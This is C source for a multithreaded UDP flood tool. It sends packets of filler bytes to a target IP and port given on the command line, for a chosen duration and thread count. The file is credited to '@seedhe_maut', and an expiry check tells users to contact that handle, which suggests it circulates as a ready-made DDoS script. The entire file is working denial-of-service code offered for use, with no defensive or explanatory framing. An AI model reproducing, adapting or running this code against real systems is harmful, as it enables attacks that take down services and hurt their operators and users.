#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

#define EXPIRY_YEAR 2025
#define EXPIRY_MONTH 3
#define EXPIRY_DAY 20

// Attack parameters (configurable via CLI)
char target_ip[20];
int target_port, attack_time, num_threads;

// Function to check expiry date
void check_expiry() {
    time_t now = time(NULL);
    struct tm expiry_date = {.tm_year = EXPIRY_YEAR - 1900, .tm_mon = EXPIRY_MONTH - 1, .tm_mday = EXPIRY_DAY};

    if (difftime(now, mktime(&expiry_date)) > 0) {
        printf("[-] This script has expired. Contact @seedhe_maut for updates.\n");
        exit(EXIT_FAILURE);
    }
}

// Function for handling errors
void handle_error(const char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

// Function executed by each attack thread
void *udp_flood(void *arg) {
    struct sockaddr_in victim;
    int sock;
    char packet[1024];

    // Set target details
    memset(&victim, 0, sizeof(victim));
    victim.sin_family = AF_INET;
    victim.sin_port = htons(target_port);
    victim.sin_addr.s_addr = inet_addr(target_ip);

    // Packet payload
    memset(packet, 'A', sizeof(packet));

    // Create a UDP socket with socket reuse
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) handle_error("Socket creation failed");

    int optval = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    printf("[+] Thread %ld attacking %s:%d\n", pthread_self(), target_ip, target_port);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < attack_time) {
        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&victim, sizeof(victim)) < 0) {
            perror("Send failed");
        }
    }

    close(sock);
    pthread_exit(NULL);
}

// Function to start attack threads
void start_attack() {
    pthread_t threads[num_threads];

    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, udp_flood, NULL) != 0) {
            handle_error("Thread creation failed");
        }
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
}

// Main function
int main(int argc, char *argv[]) {
    printf("Made and Owned by @seedhe_maut\n");

    // Check expiry before executing
    check_expiry();

    if (argc != 5) {
        printf("Usage: %s <IP> <Port> <Time (seconds)> <Threads>\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Get parameters from command line
    strncpy(target_ip, argv[1], sizeof(target_ip) - 1);
    target_port = atoi(argv[2]);
    attack_time = atoi(argv[3]);
    num_threads = atoi(argv[4]);

    printf("[*] Starting UDP flood attack on %s:%d for %d seconds using %d threads...\n",
           target_ip, target_port, attack_time, num_threads);

    start_attack();

    printf("[*] Attack completed.\n");
    return EXIT_SUCCESS;
}
